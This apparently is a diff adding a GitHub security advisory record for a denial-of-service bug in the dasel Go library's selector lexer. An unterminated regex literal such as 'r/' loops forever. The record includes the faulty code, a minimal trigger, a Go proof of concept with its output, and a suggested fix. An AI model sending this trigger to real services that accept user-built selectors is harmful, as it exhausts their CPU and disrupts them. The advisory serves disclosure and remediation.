@@ -1,0 +1,49 @@
+{
+  "id": "GHSA-m6xr-fvfg-5g64",
+  "modified": "2026-05-19T20:15:16.313743268Z",
+  "published": "2026-05-19T20:09:20Z",
+  "aliases": [
+    "CVE-2026-46378"
+  ],
+  "summary": "Dasel: Denial of service in dasel selector lexer due to infinite loop on unterminated regex literal",
+  "details": "### Summary\n\n`dasel`'s selector lexer enters a non-terminating loop when tokenizing an unterminated regex pattern such as `r/abc`. A 2-byte input (`r/`) is sufficient to cause the tokenizer to consume 100% CPU on one core indefinitely.\n\nI confirmed the issue on `v3.3.1` (`fba653c7f248aff10f2b89fca93929b64707dfc8`) and on `master` commit `0dd6132e0c58edbd9b1a5f7ffd00dfab1e6085ad`. I also verified the same code path is present in `v3.0.0` (`648f83baf070d9e00db8ff312febef857ec090a3`). No fix is available yet.\n\n### Details\n\nThe bug is in the `matchRegexPattern` closure within `(*Tokenizer).parseCurRune` in [`selector/lexer/tokenize.go#L237-L247`](https://github.com/TomWright/dasel/blob/fba653c7f248aff10f2b89fca93929b64707dfc8/selector/lexer/tokenize.go#L237-L247):\n\n```go\nmatchRegexPattern := func(pos int) *Token {\n    if p.src[pos] != 'r' || !p.peekRuneEqual(pos+1, '/') {\n        return nil\n    }\n    start := pos\n    pos += 2\n    for !p.peekRuneEqual(pos, '/') {  // line 243\n        pos++\n    }\n    pos++\n    return ptr.To(NewToken(RegexPattern, p.src[start+2:pos-1], start, pos-start))\n}\n```\n\nWhen no closing `/` exists, [`peekRuneEqual`](https://github.com/TomWright/dasel/blob/fba653c7f248aff10f2b89fca93929b64707dfc8/selector/lexer/tokenize.go#L39-L43) returns `false` when `pos \u003e= srcLen` (because the bounds check at line 40 returns `false` for out-of-range positions). Since `!false = true`, the loop condition remains true and `pos` increments indefinitely. The function never returns.\n\nNotably, the same function already handles unterminated quoted strings by returning `UnexpectedEOFError`, but the regex pattern path does not perform a similar end-of-input check.\n\nMinimal trigger: `r/` (2 bytes)\n\nTest environment:\n\n- MacBook Air (Apple M2), macOS / Darwin `arm64`\n- Go `1.26.1`\n- dasel `v3.3.1` (`fba653c7f248aff10f2b89fca93929b64707dfc8`)\n\n### PoC\n\n```go\npackage main\n\nimport (\n\t\"fmt\"\n\t\"runtime\"\n\t\"time\"\n\n\t\"github.com/tomwright/dasel/v3/selector/lexer\"\n)\n\nfunc main() {\n\tfmt.Printf(\"Go version: %s\\n\", runtime.Version())\n\tfmt.Printf(\"GOARCH: %s\\n\", runtime.GOARCH)\n\tfmt.Println()\n\n\tfor _, input := range []string{\"r/unterminated\", \"r/\"} {\n\t\tfmt.Printf(\"Input: %s\\n\", input)\n\t\tdone := make(chan string, 1)\n\t\tgo func() {\n\t\t\tt := lexer.NewTokenizer(input)\n\t\t\tstart := time.Now()\n\t\t\ttokens, err := t.Tokenize()\n\t\t\telapsed := time.Since(start)\n\t\t\tif err != nil {\n\t\t\t\tdone \u003c- fmt.Sprintf(\"Error after %v: %v\", elapsed, err)\n\t\t\t} else {\n\t\t\t\tdone \u003c- fmt.Sprintf(\"OK after %v: %d tokens\", elapsed, len(tokens))\n\t\t\t}\n\t\t}()\n\n\t\tselect {\n\t\tcase result := \u003c-done:\n\t\t\tfmt.Println(result)\n\t\tcase \u003c-time.After(5 * time.Second):\n\t\t\tfmt.Println(\"CONFIRMED: did not complete within 5s; tokenizer is stuck in non-terminating loop\")\n\t\t}\n\t\tfmt.Println()\n\t}\n}\n```\n\nObserved output on `v3.3.1` in the test environment above:\n\n```text\nGo version: go1.26.1\nGOARCH: arm64\n\nInput: r/unterminated\nCONFIRMED: did not complete within 5s; tokenizer is stuck in non-terminating loop\n\nInput: r/\nCONFIRMED: did not complete within 5s; tokenizer is stuck in non-terminating loop\n```\n\n### Impact\n\nAn attacker who can control or influence the selector/query string passed to dasel can cause the tokenizer to enter a non-terminating loop. The affected process consumes 100% CPU on one core and does not make progress until externally terminated.\n\nThe selector string is typically provided by the application developer, but there are deployment scenarios where it may be attacker-influenced:\n- Web applications using dasel for dynamic data querying\n- Applications that construct selectors from user input\n- Shared tooling environments where selectors are passed as parameters\n\n### Suggested Fix\n\nThe regex scanner should bounds-check and return an error on unterminated regex literals, consistent with unterminated quoted strings. Since `matchRegexPattern` currently returns `*Token`, the fix also requires changing the function signature to propagate errors. For example:\n\n```go\nmatchRegexPattern := func(pos int) (*Token, error) {\n    if p.src[pos] != 'r' || !p.peekRuneEqual(pos+1, '/') {\n        return nil, nil\n    }\n    start := pos\n    pos += 2\n    for pos \u003c p.srcLen \u0026\u0026 p.src[pos] != '/' {\n        pos++\n    }\n    if pos \u003e= p.srcLen {\n        return nil, \u0026UnexpectedEOFError{Pos: pos}\n    }\n    pos++\n    return ptr.To(NewToken(RegexPattern, p.src[start+2:pos-1], start, pos-start)), nil\n}\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/tomwright/dasel/v3",
+        "purl": "pkg:golang/github.com/tomwright/dasel/v3"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "3.0.0"
+            },
+            {
+              "fixed": "3.10.1"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/05/GHSA-m6xr-fvfg-5g64/GHSA-m6xr-fvfg-5g64.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/TomWright/dasel/security/advisories/GHSA-m6xr-fvfg-5g64"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/TomWright/dasel/commit/95f8dd3af12958bf6ca2a737b3ec0267280f86ed"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/TomWright/dasel"
+    }
+  ]
+}
